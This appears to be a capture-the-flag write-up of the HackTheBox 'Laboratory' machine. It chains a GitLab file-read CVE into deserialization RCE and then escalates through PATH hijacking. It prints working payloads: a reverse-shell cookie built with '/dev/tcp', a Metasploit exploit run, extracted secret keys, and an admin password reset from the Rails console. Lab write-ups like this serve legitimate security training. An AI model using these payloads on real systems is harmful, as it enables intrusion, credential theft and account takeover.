---
title: "HackTheBox - Laboratory"
author: Nasrallah
description: ""
date: 2023-05-21 00:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, linux, easy, docker, cve]
img_path: /assets/img/hackthebox/machines/laboratory
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---


# **Description**

Hello hackers, I hope you are doing well. We are doing [Laboratory](https://app.hackthebox.com/machines/) from [HackTheBox](https://www.hackthebox.com).

![](0.png)

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.10.216
Host is up (0.13s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 25ba648f799d5d95972c1bb25e9b550d (RSA)
|   256 2800890555f9a2ea3c7d70ea4dea600f (ECDSA)
|_  256 7720ffe946c068921a0b2129d153aa87 (ED25519)
80/tcp  open  http     Apache httpd 2.4.41
|_http-title: Did not follow redirect to https://laboratory.htb/
|_http-server-header: Apache/2.4.41 (Ubuntu)
443/tcp open  ssl/http Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| ssl-cert: Subject: commonName=laboratory.htb
| Subject Alternative Name: DNS:git.laboratory.htb
| Not valid before: 2020-07-05T10:39:28
|_Not valid after:  2024-03-03T10:39:28
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
|_http-title: The Laboratory
Service Info: Host: laboratory.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We found three open ports, 22 is SSH, 80 is an http server and 443 is https.

We can see the TLS certificate reveals the domain names `laboratory.htb` and `git.laboratory.htb` so let's add them to `/etc/hosts`.

## Web

Let's navigate the `http://laboratory.htb`

![](1.png)

This is a `Security & Development Services` website, nothing looks interesting, let's check the other website at `git.laboratory.htb`

![](2.png)

It's a gitlab, we don't have any credentials so let's register a user.

![](3.png)

The only domain got accepted in the email field is `laboratory.htb`.

Let's check the version of Gitlab.

![](4.png)

It's version `12.8.1`, let's search if it's vulnerable with `searchsploit`.

```terminal
$ searchsploit gitlab 12                      
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                              |  Path
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
GitLab 11.4.7 - RCE (Authenticated) (2)                                                                                     | ruby/webapps/49334.py
GitLab 11.4.7 - Remote Code Execution (Authenticated) (1)                                                                   | ruby/webapps/49257.py
GitLab 12.9.0 - Arbitrary File Read                                                                                         | ruby/webapps/48431.txt
Gitlab 12.9.0 - Arbitrary File Read (Authenticated)                                                                         | ruby/webapps/49076.py
Gitlab 6.0 - Persistent Cross-Site Scripting                                                                                | php/webapps/30329.sh
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

The version `12.9.0` is vulnerable to a file read, so our version can also has the same vulnerability right? Let's see.

I found this [exploit](https://github.com/thewhiteh4t/cve-2020-10977) that works great, let's run it.

```terminal
$ python3 cve_2020_10977.py https://git.laboratory.htb/ sirius password123                                                                      [169/453]
----------------------------------                                             
--- CVE-2020-10977 ---------------                                             
--- GitLab Arbitrary File Read ---                                                                                                                            
--- 12.9.0 & Below ---------------                                             
----------------------------------                                             
                                                                               
[>] Found By : vakzz       [ https://hackerone.com/reports/827052 ]            
[>] PoC By   : thewhiteh4t [ https://twitter.com/thewhiteh4t      ]                                                                                           
                                                                               
[+] Target        : https://git.laboratory.htb                                 
[+] Username      : sirius                                                                                                                                    
[+] Password      : password123                                                
[+] Project Names : ProjectOne, ProjectTwo                                                                                                                    
                                                                               
[!] Trying to Login...                                                                                                                                        
[+] Login Successful!                                                                                                                                         
[!] Creating ProjectOne...                                                     
[+] ProjectOne Created Successfully!                                           
[!] Creating ProjectTwo...                                                                                                                                    
[+] ProjectTwo Created Successfully!                                                                                                                          
[>] Absolute Path to File : /etc/passwd                                                                                                                       
[!] Creating an Issue...                                                       
[+] Issue Created Successfully!                                                
[!] Moving Issue...                                                            
[+] Issue Moved Successfully!                                                  
[+] File URL : https://git.laboratory.htb/sirius/ProjectTwo/uploads/061e9ca4d40d19c01c5ba00fcbb8daae/passwd
                                                                                                                                                              
> /etc/passwd                                                                  
----------------------------------------                                       
                                                                               
root:x:0:0:root:/root:/bin/bash                                                
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin                                
bin:x:2:2:bin:/bin:/usr/sbin/nologin                                           
sys:x:3:3:sys:/dev:/usr/sbin/nologin                                                                                                                          
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
git:x:998:998::/var/opt/gitlab:/bin/sh
gitlab-www:x:999:999::/var/opt/gitlab/nginx:/bin/false
gitlab-redis:x:997:997::/var/opt/gitlab/redis:/bin/false
gitlab-psql:x:996:996::/var/opt/gitlab/postgresql:/bin/sh
mattermost:x:994:994::/var/opt/gitlab/mattermost:/bin/sh
registry:x:993:993::/var/opt/gitlab/registry:/bin/sh
gitlab-prometheus:x:992:992::/var/opt/gitlab/prometheus:/bin/sh
gitlab-consul:x:991:991::/var/opt/gitlab/consul:/bin/sh

----------------------------------------
```

Great! We got file read, but what else to read?! I tried to get some ssh keys but didn't work.

We can see the author of the script has provided the [official report](https://hackerone.com/reports/827052) of this vulnerability, and the researcher who found it also provides a way to get remote code execution.

![](5.png)

# **Foothold**

## Method #2

To get an RCE we need to exploit a deserialization vulnerability of the `experimentation_subject_id` cookie. So wee need to create a malicious cookie that when it gets decode our code would get executed.

First we need to grab the secret key from `/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml`

```terminal
[>] Absolute Path to File : /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml                                                                      
[!] Creating an Issue...                                                                                                                                      
[+] Issue Created Successfully!                                                                                                                               
[!] Moving Issue...                                                                                                                                           
[+] Issue Moved Successfully!                                                                                                                                 
[+] File URL : https://git.laboratory.htb/sirius/ProjectTwo/uploads/b837789efbfb4cc8f63b0ad3ca755bca/secrets.yml
                                                                               
> /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml      
----------------------------------------                            
                                                                               
# This file is managed by gitlab-ctl. Manual changes will be        
# erased! To change the contents below, edit /etc/gitlab/gitlab.rb  
# and run `sudo gitlab-ctl reconfigure`.                                                                                                                      
                                                                               
---                                                                            
production:                                                                    
  db_key_base: 627773a77f567a5853a5c6652018f3f6e41d04aa53ed1e0df33c66b04ef0c38b88f402e0e73ba7676e93f1e54e425f74d59528fb35b170a1b9d5ce620bc11838
  secret_key_base: 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3
  otp_key_base: db3432d6fa4c43e68bf7024f3c92fea4eeea1f6be1e6ebd6bb6e40e930f0933068810311dc9f0ec78196faa69e0aac01171d62f4e225d61e0b84263903fd06af
  openid_connect_signing_key: |                                                
    -----BEGIN RSA PRIVATE KEY-----                                            
    MIIJKQIBAAKCAgEA5LQnENotwu/SUAshZ9vacrnVeYXrYPJoxkaRc2Q3JpbRcZTu
    YxMJm2+5ZDzaDu5T4xLbcM0BshgOM8N3gMcogz0KUmMD3OGLt90vNBq8Wo/9cSyV
[snip]
```

Now we need to use docker to pull the same version of gitlab `docker pull gitlab/gitlab-ce:12.8.1-ce.0`

![](6.png)

Now let's run it like the following:

```terminal
┌─[sirius@ParrotOS]─[~/CTF/HTB/Machines/laboratory]
└──╼ $ docker run --rm -it gitlab/gitlab-ce:12.8.1-ce.0 bash
root@72d8ceeab94f:/# 
```

We write the key to `/etc/gitlab/gitlab.rb`.

```bash
echo "gitlab_rails['secret_key_base']='3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc
02feea4c3adbe2cc7b65003510e4031e164137b3'" >> /etc/gitlab/gitlab.rb
```

Now we run `gitlab-ctl reconfigure`

```terminal
root@7bd73ea94997:/etc/gitlab# gitlab-ctl reconfigure                           
Starting Chef Client, version 14.14.29
resolving cookbooks for run list: ["gitlab"]
Synchronizing Cookbooks:
  - gitlab (0.0.1)
  - package (0.1.0)
[snip]
Running handlers:                                                              
                                                                               
Running handlers complete                                                      
Chef Client finished, 505/1365 resources updated in 21 minutes 07 seconds                                                                                     
gitlab Reconfigured!                                                                                                                                          
root@7bd73ea94997:/etc/gitlab#
```

After an eternity, it's done.

Now if we checked the `secrets.yml` file we see the key is there, and if it's not add manually.

```terminal
root@7bd73ea94997:/etc/gitlab# cat /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml                                                               
# This file is managed by gitlab-ctl. Manual changes will be                                                                                                  
# erased! To change the contents below, edit /etc/gitlab/gitlab.rb                                                                                            
# and run `sudo gitlab-ctl reconfigure`.                                                                                                                      
                                                                                                                                                              ---                                                                                                                                                           production:                                                                                                                                                     db_key_base: 077fa60a5fd899c76ffaa4ae1aefec7f8922184de9dd8e5b4713cd7212fc5033d37d6791f6aa08597bdc4a3323c3e731ec26a71b22484d8789d73f963660985e               
  secret_key_base: 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3           
  otp_key_base: 02a2096ad4f992052a02df4a94302750aa7b5df8fcf278244c9a9ac355a88d2b54db651ed8e2af1e362f89e5255881d6f8e1a0a8ce0a89033060f4cf9fdb7997              
  openid_connect_signing_key: |                                                                                                                               
    -----BEGIN RSA PRIVATE KEY-----                                                                                                                           
    MIIJKQIBAAKCAgEApiWCHWfCAYyLCFODPAYwujxetCqLM4e233rLg/33A7VQGTfd                                                                              
[snip]
```

Now we start `gitlab-rail console` and run the following code

```rb
request = ActionDispatch::Request.new(Rails.application.env_config)
request.env["action_dispatch.cookies_serializer"] = :marshal
cookies = request.cookie_jar

erb = ERB.new("<%= `bash -c 'bash -i >& /dev/tcp/10.10.10.10/9001 0>&1'` %>")
depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)
cookies.signed[:cookie] = depr
puts cookies[:cookie]
```

>Change the IP address and port to the one you have.

![](7.png)

We got the cookie, now we setup a listener and send the cookie with curl.

![](8.png)

We got a shell.

## Easy and headache free way using metasploit

The module `exploit/multi/http/gitlab_file_read_rce` can be used to get the shell.

```terminal
[msf](Jobs:0 Agents:0) exploit(multi/http/gitlab_file_read_rce) >> set rhosts 10.10.10.216                                                                    
rhosts => 10.10.10.216                                                                                                                                        
[msf](Jobs:0 Agents:0) exploit(multi/http/gitlab_file_read_rce) >> set vhost git.laboratory.htb                                                               
vhost => git.laboratory.htb                                                                                                                                   
[msf](Jobs:0 Agents:0) exploit(multi/http/gitlab_file_read_rce) >> set username sirius                                                                        
username => sirius                                                                                                                                            
[msf](Jobs:0 Agents:0) exploit(multi/http/gitlab_file_read_rce) >> set password password123                                                                   
password => password123                                                                                                                                       
[msf](Jobs:0 Agents:0) exploit(multi/http/gitlab_file_read_rce) >> set lhost tun0          
[msf](Jobs:0 Agents:0) exploit(multi/http/gitlab_file_read_rce) >> set ssl true                                                                               
[!] Changing the SSL option's value may require changing RPORT!                                                                                               
ssl => true                                                              
[msf](Jobs:0 Agents:0) exploit(multi/http/gitlab_file_read_rce) >> set rport 443
rport => 443
[msf](Jobs:0 Agents:0) exploit(multi/http/gitlab_file_read_rce) >> run

[*] Started reverse TCP handler on 10.10.17.90:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. GitLab 12.8.1 is a vulnerable version. 
[*] Logged in to user sirius
[*] Created project /sirius/za0CPPqN
[*] Created project /sirius/dA2cmmKj
[*] Created issue /sirius/za0CPPqN/issues/1
[*] Executing arbitrary file load
[+] File saved as: '/home/sirius/.msf4/loot/20230522110255_default_10.10.10.216_gitlab.secrets_098210.txt'
[+] Extracted secret_key_base 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3
[*] NOTE: Setting the SECRET_KEY_BASE option with the above value will skip this arbitrary file read
[*] Attempting to delete project /sirius/za0CPPqN
[*] Deleted project /sirius/za0CPPqN
[*] Attempting to delete project /sirius/dA2cmmKj
[*] Deleted project /sirius/dA2cmmKj
[*] Command shell session 1 opened (10.10.17.90:4444 -> 10.10.10.216:49858) at 2023-05-22 11:03:08 +0100

id
uid=998(git) gid=998(git) groups=998(git)

```

# **Privilege Escalation**

## dexter

With `gitlab-rails console` we can list users:

```terminal
git@git:/etc/gitlab$ gitlab-rails console
--------------------------------------------------------------------------------
 GitLab:       12.8.1 (d18b43a5f5a) FOSS
 GitLab Shell: 11.0.0
 PostgreSQL:   10.12
--------------------------------------------------------------------------------
Loading production environment (Rails 6.0.2)

irb(main):002:0> User.active
=> #<ActiveRecord::Relation [#<User id:5 @sirius>, #<User id:4 @seven>, #<User id:1 @dexter>]>
irb(main):003:0> 
```

We see there are 3 users, `sirius` which is me, `seven` and `dexter`.

Let's see who's the admin:

```terminal
irb(main):004:0> User.admins
=> #<ActiveRecord::Relation [#<User id:1 @dexter>]>
```

It's `dexter`, now let's change his password.

```terminal
irb(main):018:0> u = User.find(1)
=> #<User id:1 @dexter>
irb(main):019:0> u.password = 'pass123pass'
=> "pass123pass"
irb(main):020:0> u.password_confirmation = 'pass123pass'
=> "pass123pass"
irb(main):021:0> u.save
Enqueued ActionMailer::DeliveryJob (Job ID: 0e9f90a3-2937-429a-b195-5740f5f22dd2) to Sidekiq(mailers) with arguments: "DeviseMailer", "password_change", "deliver_now", #<GlobalID:0x00007fe067fa9110 @uri=#<URI::GID gid://gitlab/User/1>>
=> true
```

Now let's login as `dexter`.

![](9.png)

We see a new repository that was hidden before, let's check it out.

![](10.png)

We find a dexter directory with a .ssh, and inside that we can find a private ssh key.

We copy the key and ssh as dexter.

![](11.png)

## root

Let's run linpeas.

![](12.png)

We found a file called `/usr/local/bin/docker-security` with SUID permission.

Let's investigate the file.

```terminal
dexter@laboratory:/tmp$ file /usr/local/bin/docker-security                                                                                                   
/usr/local/bin/docker-security: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, Bu
ildID[sha1]=d466f1fb0f54c0274e5d05974e81f19dc1e76602, for GNU/Linux 3.2.0, not stripped                             
dexter@laboratory:/tmp$ strings /usr/local/bin/docker-security                                                                                                
                                                                                                                                                              
Command 'strings' not found, but can be installed with:                                                                                                       
                                                                                                                                                              
apt install binutils                                                                                                                                          
Please ask your administrator.                            
```

We couldn't run strings on it, let's try `strace`.

![](13.png)

The binary stries to run `chmod` without without a path so we can exploit that by creating a `chmod` file in /tmp and add /tmp to the PATH variable.

![](14.png)

We got root!

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).